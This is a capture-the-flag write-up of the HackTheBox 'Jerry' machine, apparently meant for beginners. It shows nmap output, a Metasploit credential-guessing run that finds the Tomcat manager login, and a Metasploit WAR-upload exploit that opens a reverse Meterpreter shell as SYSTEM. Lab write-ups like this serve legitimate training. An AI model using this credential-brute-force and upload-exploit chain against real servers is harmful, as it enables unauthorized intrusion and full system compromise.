---
title: "HTB: Jerry"
category: writeups
description: Full Writeup for Jerry machine from Intro to Red teaming track on HackTheBox
date: 2025-08-21
tags:
  - hackthebox
  - tomcat
  - windows
  - metasploit
authors:
  - tr3m0x
image: ./assets/cover.png
difficulty: Very Easy
---

## Port scanning


The first step is to identify which services are exposed on the target. A full TCP scan helps determine the attack surface before any deeper inspection.

```bash
tr3m0x@blackhat$ sudo nmap -sC -sV -p- -T4 --min-rate 1000 -oN nmap/tcp_scan 10.129.136.9
# Nmap 7.95 scan initiated Sun Aug 30 16:47:25 2026 as: nmap -sC -sV -p- -T4 --min-rate 1000 -oN nmap/tcp_scan 10.129.136.9
Nmap scan report for 10.129.136.9
Host is up (0.62s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 30 16:50:04 2026 -- 1 IP address (1 host up) scanned in 159.09 seconds
```
The scan shows only one port is up and it is running Apache Tomcat 7.0.88.

## Credential enumeration

using the **auxiliary/scanner/http/tomcat_mgr_login** module in Metasploit, we can enumerate the credentials for the Tomcat manager application.

```bash
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> set rhosts 10.129.136.9
rhosts => 10.129.136.9
[msf](Jobs:0 Agents:0) auxiliary(scanner/http/tomcat_mgr_login) >> run
```

we got access credentials 

```bash
[+] 10.129.136.9:8080 - Login Successful: tomcat:s3cret
```

then we can use the **exploit/multi/http/tomcat_mgr_upload** module to get a reverse shell on the target machine.

## Shell as nt authority\system
```bash
msf](Jobs:0 Agents:0) exploit(multi/http/tomcat_mgr_upload) >> run 
[*] Started reverse TCP handler on 10.10.15.47:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying ZjN8XWjDAB...
[*] Executing ZjN8XWjDAB...
[*] Sending stage (58073 bytes) to 10.129.136.9
[*] Undeploying ZjN8XWjDAB ...
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.10.15.47:4444 -> 10.129.136.9:49192) at 2026-08-30 17:11:17 +0100

(Meterpreter 1)(C:\apache-tomcat-7.0.88) > shell 
Process 1 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88> whoami
whoami
nt authority\system
```

And this is it , a very basic machine to be honest but it's a good start for beginners to learn how to use Metasploit and get a reverse shell on a target machine.
